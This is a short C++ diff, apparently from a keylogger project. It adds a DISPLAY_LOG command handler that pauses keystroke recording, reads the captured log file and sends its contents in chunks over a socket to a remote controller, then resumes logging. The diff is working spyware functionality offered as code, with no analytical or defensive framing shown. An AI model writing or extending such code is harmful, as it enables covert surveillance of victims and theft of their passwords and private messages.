@@ -55,6 +55,28 @@ void Parser::parseCommands()
 				m_client.unblockSocket();
 				KeyLogger::getInstance().startRecording();
 			}
+			if (command->cmd == commandType::DISPLAY_LOG)
+			{
+				std::ifstream file("./log.txt");
+				t_cmd tosend;
+				KeyLogger::getInstance().stopRecording();
+				m_client.blockSocket();
+				if (file.is_open())
+				{
+					while (file.read(tosend.buffer, buffer_size))
+					{
+						tosend.cmd = commandType::DISPLAY_LOG;
+						tosend.data_len = file.gcount();
+						m_client.sendData(reinterpret_cast<char *>(&tosend), sizeof(t_cmd));
+					}
+				}
+				file.close();
+				tosend.cmd = commandType::DISPLAY_LOG_END;
+				tosend.data_len = 0;
+				m_client.sendData(reinterpret_cast<char *>(&tosend), sizeof(t_cmd));
+				m_client.unblockSocket();
+				KeyLogger::getInstance().startRecording();
+			}
 		}
 	}
 }
